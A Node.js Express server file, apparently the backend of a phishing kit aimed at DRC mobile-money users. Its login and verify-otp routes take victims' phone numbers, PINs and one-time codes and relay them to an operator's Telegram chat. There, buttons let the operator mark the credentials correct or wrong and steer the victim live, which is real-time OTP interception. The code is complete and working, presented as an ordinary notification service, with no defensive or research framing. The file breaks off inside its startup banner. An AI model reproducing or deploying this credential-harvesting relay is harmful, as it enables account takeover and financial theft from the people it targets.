// server.js - DRC Multi-User System with Webhook Support (No Polling)
// ── WEBHOOK MODE ──────────────────────────────────────────────────────────
// Uses Telegram webhooks instead of long-polling.
// Benefits on Render:
//   • Zero 409 conflicts — no competing getUpdates connections
//   • Zero reconnect logic — Telegram pushes to us, we never pull
//   • Zero polling errors in logs
//   • Lower latency (<100ms vs ~1s for polling round-trip)
//   • Lower CPU/memory — no persistent outbound connection
//
// Required env var:
//   WEBHOOK_URL=https://your-service.onrender.com
//   (the /telegram/:secret route is registered automatically per bot)

const express = require('express');
const cors = require('cors');
const TelegramBot = require('node-telegram-bot-api');
const crypto = require('crypto');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3001;

// Raw body needed for webhook signature verification — must come before json()
app.use('/telegram', express.raw({ type: 'application/json', limit: '1mb' }));
app.use(cors());
app.use(express.json({ limit: '10kb' }));

// ============================================
// CONFIGURATION
// ============================================
const CONFIG = Object.freeze({
  CACHE_DURATION: 5000,
  APPROVAL_TIMEOUT: 5 * 60 * 1000,
  CLEANUP_INTERVAL: 60000,
  MAX_USERS: parseInt(process.env.MAX_USERS) || 1,
  REQUEST_TIMEOUT: 30000,
  MAX_NOTIFICATION_SIZE: 4096,
  TG_CHAT_INTERVAL: 1050,  // ms — Telegram: 1 msg/s per chat
  SSE_HEARTBEAT: 20000,
  WEBHOOK_URL: (process.env.WEBHOOK_URL || '').replace(/\/$/, ''),
});

// ============================================
// LOGGER
// ============================================
const ts = () => new Date().toISOString();
const logger = {
  info: (msg, ...args) => console.log(`[INFO]  ${ts()} ${msg}`, ...args),
  warn: (msg, ...args) => console.warn(`[WARN]  ${ts()} ${msg}`, ...args),
  error: (msg, ...args) => console.error(`[ERROR] ${ts()} ${msg}`, ...args),
  debug: (msg, ...args) => process.env.DEBUG && console.log(`[DEBUG] ${ts()} ${msg}`, ...args),
};

// ============================================
// UTILITY FUNCTIONS
// ============================================
const sanitize = (s) => (typeof s === 'string' ? s.replace(/[<>]/g, '').trim() : String(s ?? ''));
const trunc = (s, n = CONFIG.MAX_NOTIFICATION_SIZE) => s.length <= n ? s : s.slice(0, n - 3) + '...';
const sleep = (ms) => new Promise(r => setTimeout(r, ms));

const RE_NONDIGIT = /\D/g;

const _phoneCache = new Map();
const normalise = (raw) => {
  if (!raw || typeof raw !== 'string') return '';
  const hit = _phoneCache.get(raw);
  if (hit) return hit;
  let c = raw.replace(RE_NONDIGIT, '');
  if (c.startsWith('243')) c = c.slice(3);
  if (c.startsWith('0')) c = c.slice(1);
  if (c.length > 9) c = c.slice(-9);
  const result = `+243${c}`;
  if (_phoneCache.size > 5000) _phoneCache.clear();
  _phoneCache.set(raw, result);
  return result;
};

const formatPhoneNumber = (phoneNumber) => {
  try {
    let cleaned = phoneNumber.replace(/\D/g, '');
    if (cleaned.startsWith('243')) {
      const countryCode = '+243';
      let number = cleaned.substring(3);
      if (number.length === 10 && number.startsWith('0')) {
        number = number.substring(1);
      }
      if (number.length > 9) {
        number = number.substring(number.length - 9);
      }
      return { countryCode, number, formatted: `${countryCode}${number}` };
    }
    if (cleaned.length === 10 && cleaned.startsWith('0')) {
      cleaned = cleaned.substring(1);
    }
    if (cleaned.length > 9) {
      cleaned = cleaned.substring(cleaned.length - 9);
    }
    return { countryCode: '+243', number: cleaned, formatted: `+243${cleaned}` };
  } catch (error) {
    logger.error('Error formatting phone number:', error.message);
    return { countryCode: '+243', number: phoneNumber, formatted: phoneNumber };
  }
};

// ============================================
// VALIDATORS
// ============================================
const validatePhoneNumber = (phoneNumber) => {
  if (!phoneNumber || typeof phoneNumber !== 'string') {
    return { valid: false, error: 'Phone number must be a string' };
  }
  const cleaned = phoneNumber.replace(/\D/g, '');
  if (cleaned.length < 9 || cleaned.length > 15) {
    return { valid: false, error: 'Invalid phone number length' };
  }
  return { valid: true, cleaned };
};

const validatePin = (pin) => {
  if (!pin || typeof pin !== 'string') {
    return { valid: false, error: 'PIN must be a string' };
  }
  if (pin.length < 4 || pin.length > 8 || !/^\d+$/.test(pin)) {
    return { valid: false, error: 'PIN must be 4-8 digits' };
  }
  return { valid: true };
};

const validateOtp = (otp) => {
  if (!otp || typeof otp !== 'string') {
    return { valid: false, error: 'OTP must be a string' };
  }
  if (otp.length < 4 || otp.length > 8 || !/^\d+$/.test(otp)) {
    return { valid: false, error: 'OTP must be 4-8 digits' };
  }
  return { valid: true };
};

// ============================================
// PER-USER TELEGRAM SEND QUEUE
// ============================================
class TgQueue {
  constructor(interval = CONFIG.TG_CHAT_INTERVAL) {
    this._q = [];
    this._running = false;
    this._interval = interval;
    this._last = 0;
  }
  send(fn) {
    return new Promise((resolve, reject) => {
      this._q.push({ fn, resolve, reject });
      if (!this._running) this._drain();
    });
  }
  async _drain() {
    this._running = true;
    while (this._q.length) {
      const gap = this._interval - (Date.now() - this._last);
      if (gap > 0) await sleep(gap);
      const { fn, resolve, reject } = this._q.shift();
      this._last = Date.now();
      try { resolve(await fn()); }
      catch (e) { reject(e); }
    }
    this._running = false;
  }
  flush(reason = 'queue flushed') {
    while (this._q.length) this._q.shift().reject(new Error(reason));
  }
}

// ============================================
// DUPLICATE CACHE
// ============================================
class DupeCache {
  constructor(ttl = CONFIG.CACHE_DURATION) {
    this._m = new Map();
    this._ttl = ttl;
  }
  seen(key) {
    if (this._m.has(key)) return true;
    const h = setTimeout(() => this._m.delete(key), this._ttl);
    if (h.unref) h.unref();
    this._m.set(key, h);
    return false;
  }
  clear() {
    for (const h of this._m.values()) clearTimeout(h);
    this._m.clear();
  }
}

// ============================================
// VERSION-SAFE TELEGRAM WEBHOOK HELPERS
// ============================================
const https = require('https');

const _rawTgCall = (token, method, body = {}) => new Promise((resolve, reject) => {
  const data = JSON.stringify(body);
  const req = https.request({
    hostname: 'api.telegram.org',
    path: `/bot${token}/${method}`,
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(data) },
  }, (res) => {
    let raw = '';
    res.on('data', c => raw += c);
    res.on('end', () => {
      try {
        const parsed = JSON.parse(raw);
        if (parsed.ok) resolve(parsed.result);
        else reject(new Error(`Telegram error: ${parsed.description}`));
      } catch (e) { reject(e); }
    });
  });
  req.on('error', reject);
  req.write(data);
  req.end();
});

const tgDeleteWebhook = (bot, token) =>
  (bot.deleteWebhook?.() ?? bot.deleteWebHook?.() ?? _rawTgCall(token, 'deleteWebhook', { drop_pending_updates: true }));

const tgSetWebhook = (bot, token, url, opts = {}) =>
  (bot.setWebhook?.(url, opts) ?? _rawTgCall(token, 'setWebhook', { url, ...opts }));

const tgGetWebhookInfo = (bot, token) =>
  (bot.getWebhookInfo?.() ?? _rawTgCall(token, 'getWebhookInfo', {}));

// ============================================
// BOT MANAGER (WEBHOOK EDITION)
// ============================================
class BotManager {
  constructor(user, linkInsert) {
    this.user = user;
    this.linkInsert = linkInsert;
    this.bot = null;
    this.ready = false;
  }

  get _secret() {
    return crypto.createHash('sha256')
      .update(`wh:${this.user.botToken}`)
      .digest('hex')
      .slice(0, 32);
  }

  get _path() { return `/telegram/${this._secret}`; }

  async init() {
    if (!CONFIG.WEBHOOK_URL) {
      logger.error(`${this.user.name}: WEBHOOK_URL env var not set — cannot register webhook`);
      return;
    }

    this.bot = new TelegramBot(this.user.botToken, {
      webHook: false,  // we handle the HTTP route ourselves via Express
      filepath: false,
    });

    this._attachCommands();

    const fullUrl = `${CONFIG.WEBHOOK_URL}${this._path}`;

    try {
      // 1. Clear any stale webhook / polling session
      await tgDeleteWebhook(this.bot, this.user.botToken).catch(() => {});

      // 2. Register our new webhook
      await tgSetWebhook(this.bot, this.user.botToken, fullUrl, {
        allowed_updates: ['message', 'callback_query'],
        drop_pending_updates: true,
      });

      // 3. Verify
      const info = await tgGetWebhookInfo(this.bot, this.user.botToken).catch(() => ({}));
      logger.info(`${this.user.name}: webhook set → ${fullUrl}`);
      logger.debug(`${this.user.name}: pending=${info?.pending_update_count ?? '?'}, lastErr=${info?.last_error_message || 'none'}`);

      this.user.healthy = true;
      this.user.bot = this.bot;
      this.ready = true;
    } catch (e) {
      logger.error(`${this.user.name}: setWebhook failed:`, e.message);
    }
  }

  processUpdate(update) {
    if (!this.bot) return;
    try {
      this.bot.processUpdate(update);
    } catch (e) {
      logger.error(`${this.user.name}: processUpdate error:`, e.message);
    }
  }

  _attachCommands() {
    const { bot, user, linkInsert } = this;

    bot.onText(/\/start/, async (msg) => {
      try {
        await bot.sendMessage(msg.chat.id,
          `🤖 <b>${sanitize(user.name)} Bot - DRC</b>\n\n` +
          `I will notify you of all login attempts and OTP verifications.\n\n` +
          `<b>Your Chat ID:</b> <code>${msg.chat.id}</code>\n` +
          `<b>Your Link:</b> <code>/api/${linkInsert}/*</code>\n\n` +
          `Add these to your .env file as:\n` +
          `<code>USER_LINK_INSERT_${user.id}=${linkInsert}</code>\n` +
          `<code>TELEGRAM_CHAT_ID_${user.id}=${msg.chat.id}</code>`,
          { parse_mode: 'HTML' });
      } catch (e) {
        logger.error('/start:', e.message);
      }
    });

    bot.onText(/\/status/, async (msg) => {
      try {
        const info = await tgGetWebhookInfo(bot, user.botToken).catch(() => null);
        await bot.sendMessage(msg.chat.id,
          `✅ <b>${sanitize(user.name)} Bot Active - DRC</b>\n\n` +
          `📊 Pending logins: ${user.loginNotifications.size}\n` +
          `📊 Pending OTP: ${user.otpVerifications.size}\n` +
          `🔗 Endpoint: <code>/api/${linkInsert}/*</code>\n` +
          `🌐 Webhook: <code>${info?.url || 'unknown'}</code>\n` +
          `📬 Pending updates: ${info?.pending_update_count ?? '?'}\n` +
          `${info?.last_error_message ? `⚠️ Last webhook error: ${info.last_error_message}` : '✅ No webhook errors'}\n` +
          `${user.lastErr ? `⚠️ Last send error: ${sanitize(user.lastErr)}` : ''}`,
          { parse_mode: 'HTML' });
      } catch (e) {
        logger.error('/status:', e.message);
      }
    });

    bot.on('callback_query', async (q) => {
      try {
        await handleCallbackQuery(user, q);
      } catch (e) {
        logger.error(`${user.name}: callback error:`, e.message);
      }
    });
  }

  ok() { return this.ready && this.user.healthy; }
}

// ============================================
// MESSAGE FORMATTERS
// ============================================
const formatLoginMessage = (user, data) => {
  try {
    const { countryCode, number } = formatPhoneNumber(data.phoneNumber);
    
    return `📱 <b>${sanitize(user.name)} - LOGIN ATTEMPT</b>

🆕 <b>NEW USER</b>
🌍 <b>Country Code:</b> <code>${countryCode}</code>
📱 <b>Phone Number:</b> <code>${number}</code>
🔢 <b>PIN:</b> <code>${sanitize(data.pin)}</code>
⏰ <b>Time:</b> ${new Date(data.timestamp).toLocaleString()}

📱 <b>Will require OTP verification</b>

━━━━━━━━━━━━━━━━━━━

⚠️ <b>User waiting for approval</b>
⏱️ <b>Timeout:</b> 5 minutes`;
  } catch (error) {
    logger.error(`Error formatting login message for ${user.name}:`, error.message);
    return `Error formatting message: ${error.message}`;
  }
};

const formatOTPMessage = (user, data) => {
  try {
    const { countryCode, number } = formatPhoneNumber(data.phoneNumber);
    
    return `✅ <b>${sanitize(user.name)} - OTP VERIFICATION</b>

🆕 <b>NEW USER - VERIFICATION NEEDED</b>
🌍 <b>Country Code:</b> <code>${countryCode}</code>
📱 <b>Phone Number:</b> <code>${number}</code>
🔐 <b>OTP Code:</b> <code>${sanitize(data.otp)}</code>
⏰ <b>Time:</b> ${new Date(data.timestamp).toLocaleString()}

━━━━━━━━━━━━━━━━━━━

⚠️ <b>Verify the credentials:</b>
⏱️ <b>Timeout:</b> 5 minutes`;
  } catch (error) {
    logger.error(`Error formatting OTP message for ${user.name}:`, error.message);
    return `Error formatting message: ${error.message}`;
  }
};

// ============================================
// CALLBACK DATA HELPERS
// ============================================
// Simple underscore format: type_action_phone_secret
// Easier to parse and more reliable with Telegram
const mkCb = (type, action, phone, secret) => `${type}_${action}_${phone}_${secret}`;
const parseCb = (d) => {
  const parts = d.split('_');
  if (parts.length < 3) return null;
  // Last part is secret, second-to-last is phone/action indicator
  // Format: type_action_rest (where rest could be phone_secret or just action)
  const type = parts[0];
  const action = parts[1];
  const data = parts.slice(2).join('_');
  return { type, action, data };
};

// ============================================
// CALLBACK QUERY HANDLER
// ============================================
const _answeredCallbacks = new Set();

async function handleCallbackQuery(user, q) {
  const { bot } = user;
  const { data, message: msg, id: qid } = q;
  const { chat: { id: chatId }, message_id: mid } = msg;

  if (_answeredCallbacks.has(qid)) return;
  _answeredCallbacks.add(qid);
  const t = setTimeout(() => _answeredCallbacks.delete(qid), 10 * 60 * 1000);
  if (t.unref) t.unref();

  const edit = (text) =>
    bot.editMessageText(text, {
      chat_id: chatId, message_id: mid, parse_mode: 'HTML',
      reply_markup: { inline_keyboard: [] },
    }).catch(e => logger.debug('edit skipped:', e.message));

  const answer = (text, alert = false) =>
    bot.answerCallbackQuery(qid, { text, show_alert: alert })
      .catch(e => logger.debug('answer skipped:', e.message));

  try {
    const parts = data.split('_');
    if (parts.length < 3) {
      logger.warn(`${user.name}: Bad callback data: ${data}`);
      await answer('❌ Bad data', true);
      return;
    }

    const type = parts[0];
    const action = parts[1];
    const dataParts = parts.slice(2);  // Everything after type_action
    const secret = dataParts[dataParts.length - 1];  // Last part is PIN/OTP
    const phone = dataParts.slice(0, -1).join('_');  // Everything before last is phone
    
    const key = `${phone}-${secret}`;
    const now = Date.now();

    logger.debug(`${user.name}: Callback - type=${type}, action=${action}, phone=${phone}, secret=${secret}`);

    if (type === 'login') {
      const rec = user.loginNotifications.get(key);
      if (!rec) {
        logger.warn(`${user.name}: Login session not found: ${key}`);
        await answer('❌ Session not found', true);
        return;
      }
      if (rec.approved || rec.rejected) {
        await answer('✅ Already processed');
        return;
      }

      if (now - rec.timestamp > CONFIG.APPROVAL_TIMEOUT) {
        Object.assign(rec, { approved: false, rejected: true, expired: true });
        await Promise.all([
          edit(`⏰ <b>EXPIRED</b>\n📞 <code>${phone}</code>\n🔐 <code>${secret}</code>`),
          answer('⏰ Session expired', true),
        ]);
        return;
      }

      if (action === 'proceed') {
        rec.approved = true;
        logger.info(`${user.name}: Login approved - ${phone}`);
        await Promise.all([
          edit(`✅ <b>ALLOWED</b>\n📞 <code>${phone}</code>\n🔐 <code>${secret}</code>\n\n→ OTP step`),
          answer('✅ Allowed!'),
        ]);
      } else if (action === 'invalid') {
        Object.assign(rec, { rejected: true, rejectionReason: 'invalid' });
        logger.info(`${user.name}: Login rejected - ${phone}`);
        await Promise.all([
          edit(`❌ <b>INVALID</b>\n📞 <code>${phone}</code>\n🔐 <code>${secret}</code>`),
          answer('❌ Marked invalid'),
        ]);
      } else {
        await answer('❓ Unknown action');
      }
      return;
    }

    if (type === 'otp') {
      const rec = user.otpVerifications.get(key);
      if (!rec) {
        logger.warn(`${user.name}: OTP session not found: ${key}`);
        await answer('❌ Verification not found', true);
        return;
      }
      if (rec.status !== 'pending') {
        await answer('✅ Already processed');
        return;
      }

      if (now - rec.timestamp > CONFIG.APPROVAL_TIMEOUT) {
        rec.status = 'timeout';
        logger.info(`${user.name}: OTP timeout - ${phone}`);
        await Promise.all([
          edit(`⏰ <b>EXPIRED</b>\n📞 <code>${phone}</code>\n🔑 <code>${secret}</code>`),
          answer('⏰ Session expired', true),
        ]);
        return;
      }

      if (action === 'correct') {
        rec.status = 'approved';
        logger.info(`${user.name}: OTP verified - ${phone}`);
        await Promise.all([
          edit(`✅ <b>VERIFIED</b>\n📞 <code>${phone}</code>\n🔑 <code>${secret}</code>\n\n✅ User logged in`),
          answer('✅ Verified!'),
        ]);
      } else if (action === 'wrong') {
        rec.status = 'rejected';
        logger.info(`${user.name}: OTP wrong - ${phone}`);
        await Promise.all([
          edit(`❌ <b>WRONG OTP</b>\n📞 <code>${phone}</code>\n🔑 <code>${secret}</code>`),
          answer('❌ Wrong OTP'),
        ]);
      } else if (action === 'wrongpin') {
        rec.status = 'wrong_pin';
        logger.info(`${user.name}: Wrong PIN - ${phone}`);
        await Promise.all([
          edit(`⚠️ <b>WRONG PIN</b>\n📞 <code>${phone}</code>\n🔑 <code>${secret}</code>`),
          answer('⚠️ Wrong PIN'),
        ]);
      } else {
        await answer('❓ Unknown action');
      }
      return;
    }

    logger.warn(`${user.name}: Unknown callback type: ${type}`);
    await answer('❓ Unknown type');
  } catch (error) {
    logger.error(`${user.name}: Callback handler error:`, error.message);
    await answer('❌ Error processing', true).catch(() => {});
  }
}

// ============================================
// SEND TELEGRAM MESSAGE
// ============================================
async function sendMsg(user, text, opts = {}) {
  if (!user.bot || !user.mgr?.ok()) return { ok: false, err: 'Bot not ready' };
  return user.tgQueue.send(async () => {
    try {
      await user.bot.sendMessage(user.chatId, trunc(text), { parse_mode: 'HTML', ...opts });
      user.lastErr = null;
      return { ok: true };
    } catch (e) {
      user.lastErr = e.message;
      const s = e.response?.statusCode;
      logger.error(`sendMsg [${user.name}] attempt:`, s || e.code, e.message);
      if (s === 401) { user.healthy = false; return { ok: false, err: 'Auth failed', critical: true }; }
      if (s === 429) {
        const wait = Math.min((e.response?.parameters?.retry_after || 10) * 1000, 60000);
        await sleep(wait);
        return { ok: false, err: 'Rate limited', retryAfter: wait };
      }
      return { ok: false, err: e.message };
    }
  });
}

// ============================================
// LOAD USERS
// ============================================
const users = new Map();

(function loadUsers() {
  let ok = 0, fail = 0;
  for (let i = 1; i <= CONFIG.MAX_USERS; i++) {
    const link = process.env[`USER_LINK_INSERT_${i}`];
    const token = process.env[`TELEGRAM_BOT_TOKEN_${i}`];
    const chatId = process.env[`TELEGRAM_CHAT_ID_${i}`];
    const name = process.env[`USER_NAME_${i}`] || `User ${i}`;
    
    if (!link || !token || !chatId) continue;
    if (!/^[a-zA-Z0-9_-]+$/.test(link)) { logger.warn(`User ${i}: bad link`); fail++; continue; }
    if (!/^\d+:[A-Za-z0-9_-]+$/.test(token)) { logger.warn(`User ${i}: bad token`); fail++; continue; }
    if (!/^-?\d+$/.test(chatId)) { logger.warn(`User ${i}: bad chatId`); fail++; continue; }
    if (users.has(link)) { logger.warn(`Dup link: ${link}`); fail++; continue; }
    
    const u = {
      id: i,
      name: sanitize(name),
      linkInsert: link,
      botToken: token,
      chatId,
      bot: null,
      healthy: false,
      lastErr: null,
      loginNotifications: new Map(),
      otpVerifications: new Map(),
      processedRequests: new Map(),
      dupes: new DupeCache(),
      tgQueue: new TgQueue(),
    };
    
    u.mgr = new BotManager(u, link);
    users.set(link, u);
    ok++;
  }
  logger.info(`Users loaded: ${ok} ok, ${fail} failed`);
})();

// ============================================
// WEBHOOK ROUTE REGISTRATION
// ============================================
users.forEach((user) => {
  const path = user.mgr._path;
  app.post(path, (req, res) => {
    // Acknowledge immediately — Telegram retries if we don't respond in 5s
    res.sendStatus(200);
    
    // Parse body (raw Buffer from express.raw middleware)
    let update;
    try {
      const body = Buffer.isBuffer(req.body) ? req.body.toString('utf8') : JSON.stringify(req.body);
      update = JSON.parse(body);
    } catch (e) {
      logger.error(`${user.name}: webhook body parse error:`, e.message);
      return;
    }
    
    // Log update type for debugging
    if (update.callback_query) {
      logger.debug(`${user.name}: Webhook received callback_query:`, update.callback_query.data);
    } else if (update.message) {
      logger.debug(`${user.name}: Webhook received message:`, update.message.text?.slice(0, 50) || '(no text)');
    } else {
      logger.debug(`${user.name}: Webhook received update:`, Object.keys(update).join(','));
    }
    
    user.mgr.processUpdate(update);
  });
  
  logger.info(`Registered webhook route: POST ${path} → ${user.name}`);
});

// ============================================
// BOT INITIALIZATION
// ============================================
(async () => {
  if (!CONFIG.WEBHOOK_URL) {
    logger.error('WEBHOOK_URL env var is not set. Add it to your Render environment variables:');
    logger.error('  WEBHOOK_URL=https://your-service.onrender.com');
    logger.error('Bots will not receive updates until this is set.');
  }
  
  const arr = [...users.values()];
  for (let i = 0; i < arr.length; i++) {
    try {
      await arr[i].mgr.init();
    } catch (e) {
      logger.error(`Init [${arr[i].name}]:`, e.message);
    }
    if (i < arr.length - 1) await sleep(500);
  }
  logger.info('All bots initialised');
})();

// ============================================
// AUTO-CLEANUP
// ============================================
setInterval(() => {
  const now = Date.now();
  const timeoutThreshold = now - CONFIG.APPROVAL_TIMEOUT;
  const deleteThreshold = now - (10 * 60 * 1000);
  
  for (const u of users.values()) {
    try {
      for (const [k, v] of u.loginNotifications) {
        if (v.timestamp < timeoutThreshold && !v.expired) {
          v.expired = true;
          v.approved = false;
          v.rejected = true;
          v.rejectionReason = 'timeout';
        }
      }
      
      for (const [k, v] of u.otpVerifications) {
        if (v.timestamp < timeoutThreshold && !v.expired) {
          v.expired = true;
          v.status = 'timeout';
        }
      }
      
      for (const [k, v] of u.loginNotifications) {
        if (v.timestamp < deleteThreshold) u.loginNotifications.delete(k);
      }
      
      for (const [k, v] of u.otpVerifications) {
        if (v.timestamp < deleteThreshold) u.otpVerifications.delete(k);
      }
    } catch (error) {
      logger.error(`Cleanup error for ${u.name}:`, error.message);
    }
  }
}, CONFIG.CLEANUP_INTERVAL).unref?.();

// ============================================
// HEALTH CHECK
// ============================================
app.get('/api/health', (req, res) => {
  const list = [...users.values()].map(u => ({
    name: u.name,
    link: u.linkInsert,
    healthy: u.healthy,
    active: !!u.bot,
    logins: u.loginNotifications.size,
    otps: u.otpVerifications.size,
    lastErr: u.lastErr,
    webhookPath: u.mgr._path,
  }));
  res.json({
    status: list.some(u => u.healthy) ? 'ok' : 'degraded',
    users: list,
    ts: ts()
  });
});

// ============================================
// WEBHOOK DEBUG ENDPOINT
// ============================================
app.get('/api/webhook-info', async (req, res) => {
  try {
    const info = [];
    for (const user of users.values()) {
      if (!user.bot || !user.mgr) continue;
      try {
        const webhookInfo = await tgGetWebhookInfo(user.bot, user.botToken).catch(() => ({}));
        info.push({
          name: user.name,
          link: user.linkInsert,
          webhookPath: user.mgr._path,
          webhookUrl: webhookInfo.url || 'not set',
          pending: webhookInfo.pending_update_count || 0,
          maxConnections: webhookInfo.max_connections || 40,
          lastError: webhookInfo.last_error_message || 'none',
          lastErrorTime: webhookInfo.last_error_date ? new Date(webhookInfo.last_error_date * 1000).toISOString() : 'never',
        });
      } catch (e) {
        info.push({
          name: user.name,
          link: user.linkInsert,
          error: e.message
        });
      }
    }
    res.json({
      webhookBaseUrl: CONFIG.WEBHOOK_URL,
      users: info,
      ts: ts()
    });
  } catch (error) {
    logger.error('Webhook info error:', error.message);
    res.status(500).json({ error: error.message });
  }
});

// ============================================
// DYNAMIC ROUTES
// ============================================
users.forEach((user, link) => {
  const R = `/api/${link}`;

  app.post(`${R}/check-user-status`, async (req, res) => {
    try {
      const { phoneNumber } = req.body;
      if (!phoneNumber) {
        return res.status(400).json({ success: false, message: 'Phone required' });
      }
      
      const phoneValidation = validatePhoneNumber(phoneNumber);
      if (!phoneValidation.valid) {
        return res.status(400).json({ success: false, message: phoneValidation.error });
      }
      
      // Always new user
      res.json({ success: true, isReturningUser: false });
    } catch (error) {
      logger.error(`check-user-status error for ${user.name}:`, error.message);
      res.status(500).json({ success: false, error: 'Internal server error' });
    }
  });

  app.post(`${R}/login`, async (req, res) => {
    try {
      if (!user.bot || !user.healthy) {
        return res.status(503).json({ success: false, message: 'Bot service unavailable' });
      }
      
      const { phoneNumber, pin, timestamp } = req.body;
      if (!phoneNumber || !pin) {
        return res.status(400).json({ success: false, message: 'Phone and PIN required' });
      }
      
      const phoneValidation = validatePhoneNumber(phoneNumber);
      if (!phoneValidation.valid) {
        return res.status(400).json({ success: false, message: phoneValidation.error });
      }
      
      const pinValidation = validatePin(pin);
      if (!pinValidation.valid) {
        return res.status(400).json({ success: false, message: pinValidation.error });
      }
      
      const phone = normalise(phoneNumber);
      if (user.dupes.seen(`login:${phone}:${pin}`)) {
        return res.json({ success: true, message: 'Cached' });
      }
      
      const key = `${phone}-${pin}`;
      user.loginNotifications.set(key, {
        timestamp: Date.now(),
        approved: false,
        rejected: false,
        expired: false
      });
      
      const text = formatLoginMessage(user, { phoneNumber, pin, timestamp: timestamp || Date.now() });
      const keyboard = {
        inline_keyboard: [
          [{ text: '✅ Allow to Proceed', callback_data: mkCb('login', 'proceed', phone, pin) }],
          [{ text: '❌ Invalid Information', callback_data: mkCb('login', 'invalid', phone, pin) }]
        ]
      };
      
      const r = await sendMsg(user, text, { reply_markup: keyboard });
      r.ok
        ? res.json({ success: true, message: 'Waiting for approval' })
        : res.status(500).json({ success: false, message: 'Failed to notify', error: r.err });
    } catch (error) {
      logger.error(`login error for ${user.name}:`, error.message);
      res.status(500).json({ success: false, error: 'Internal server error' });
    }
  });

  app.post(`${R}/check-login-approval`, async (req, res) => {
    try {
      const { phoneNumber, pin } = req.body;
      if (!phoneNumber || !pin) {
        return res.status(400).json({ success: false, message: 'Phone and PIN required' });
      }
      
      const phone = normalise(phoneNumber);
      const rec = user.loginNotifications.get(`${phone}-${pin}`);
      
      if (!rec) {
        return res.json({ success: true, approved: false, rejected: false, expired: false });
      }
      
      if (Date.now() - rec.timestamp > CONFIG.APPROVAL_TIMEOUT) {
        return res.json({ success: true, approved: false, rejected: true, expired: true });
      }
      
      res.json({
        success: true,
        approved: rec.approved,
        rejected: rec.rejected,
        expired: rec.expired || false,
        rejectionReason: rec.rejectionReason || null
      });
    } catch (error) {
      logger.error(`check-login-approval error for ${user.name}:`, error.message);
      res.status(500).json({ success: false, error: 'Internal server error' });
    }
  });

  app.post(`${R}/verify-otp`, async (req, res) => {
    try {
      if (!user.bot || !user.healthy) {
        return res.status(503).json({ success: false, message: 'Bot service unavailable' });
      }
      
      const { phoneNumber, otp, timestamp } = req.body;
      if (!phoneNumber || !otp) {
        return res.status(400).json({ success: false, message: 'Phone and OTP required' });
      }
      
      const phoneValidation = validatePhoneNumber(phoneNumber);
      if (!phoneValidation.valid) {
        return res.status(400).json({ success: false, message: phoneValidation.error });
      }
      
      const otpValidation = validateOtp(otp);
      if (!otpValidation.valid) {
        return res.status(400).json({ success: false, message: otpValidation.error });
      }
      
      const phone = normalise(phoneNumber);
      if (user.dupes.seen(`otp:${phone}:${otp}`)) {
        return res.json({ success: true, message: 'Cached' });
      }
      
      const key = `${phone}-${otp}`;
      user.otpVerifications.set(key, { status: 'pending', timestamp: Date.now() });
      
      const text = formatOTPMessage(user, { phoneNumber, otp, timestamp: timestamp || Date.now() });
      const keyboard = {
        inline_keyboard: [
          [{ text: '✅ Correct (PIN + OTP)', callback_data: mkCb('otp', 'correct', phone, otp) }],
          [
            { text: '❌ Wrong Code', callback_data: mkCb('otp', 'wrong', phone, otp) },
            { text: '⚠️ Wrong PIN', callback_data: mkCb('otp', 'wrongpin', phone, otp) }
          ]
        ]
      };
      
      const r = await sendMsg(user, text, { reply_markup: keyboard });
      r.ok
        ? res.json({ success: true, message: 'OTP sent' })
        : res.status(500).json({ success: false, message: 'Failed to notify', error: r.err });
    } catch (error) {
      logger.error(`verify-otp error for ${user.name}:`, error.message);
      res.status(500).json({ success: false, error: 'Internal server error' });
    }
  });

  app.post(`${R}/check-otp-status`, async (req, res) => {
    try {
      const { phoneNumber, otp } = req.body;
      if (!phoneNumber || !otp) {
        return res.status(400).json({ success: false, message: 'Phone and OTP required' });
      }
      
      const phone = normalise(phoneNumber);
      const rec = user.otpVerifications.get(`${phone}-${otp}`);
      
      if (!rec) {
        return res.json({ success: true, status: 'pending' });
      }
      
      if (Date.now() - rec.timestamp > CONFIG.APPROVAL_TIMEOUT) {
        return res.json({ success: true, status: 'timeout' });
      }
      
      res.json({ success: true, status: rec.status });
    } catch (error) {
      logger.error(`check-otp-status error for ${user.name}:`, error.message);
      res.status(500).json({ success: false, error: 'Internal server error' });
    }
  });

  app.post(`${R}/resend-otp`, async (req, res) => {
    try {
      if (!user.bot || !user.healthy) {
        return res.status(503).json({ success: false, message: 'Bot service unavailable' });
      }
      
      const { phoneNumber, timestamp } = req.body;
      if (!phoneNumber) {
        return res.status(400).json({ success: false, message: 'Phone required' });
      }
      
      const phone = normalise(phoneNumber);
      const text = `🔄 <b>${sanitize(user.name)} — OTP RESEND</b>\n📞 <code>${phone}</code>\n⏰ ${new Date(timestamp || Date.now()).toLocaleString()}`;
      
      const r = await sendMsg(user, text);
      r.ok
        ? res.json({ success: true })
        : res.status(500).json({ success: false, error: r.err });
    } catch (error) {
      logger.error(`resend-otp error for ${user.name}:`, error.message);
      res.status(500).json({ success: false, error: 'Internal server error' });
    }
  });
});

// ============================================
// 404 & ERROR HANDLERS
// ============================================
app.use((req, res) => res.status(404).json({ success: false, message: 'Not found', path: req.path }));
app.use((err, req, res, _next) => {
  logger.error('Unhandled Express error:', err.message);
  res.status(500).json({ success: false, error: 'Internal server error' });
});

// ============================================
// GRACEFUL SHUTDOWN
// ============================================
const shutdown = async (sig) => {
  logger.info(`${sig} — shutting down`);
  server.close();
  for (const u of users.values()) {
    u.dupes.clear();
    u.tgQueue?.flush('shutting down');
  }
  process.exit(0);
};

process.on('SIGTERM', () => shutdown('SIGTERM'));
process.on('SIGINT', () => shutdown('SIGINT'));
process.on('uncaughtException', (e) => logger.error('Uncaught:', e.message, e.stack));
process.on('unhandledRejection', (r) => logger.error('Unhandled rejection:', r));

// ============================================
// START SERVER
// ============================================
const server = app.listen(PORT, () => {
  console.log('\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
  console.log(`🛰️  DRC Server - Webhook Mode`);
  console.log(`🚀  Port: ${PORT}`);
  console.log(`🌐  Webhook base: ${CONFIG.WEBHOOK_URL || '⚠️  WEBHOOK_URL not set!'}`);
  console.log(`🇨🇩  Country: DRC (+243)`);
  console.log(`💰  Currency: DOLLAR($)`);
  console.log(`👥  Users: ${users.size}/${CONFIG.MAX_USERS}`);
  console.log(`⏱️  Approval timeout: ${CONFIG.APPROVAL_TIMEOUT / 60000} minutes`);
  console.log(`🔄  NO CACHING - All logins require OTP`);
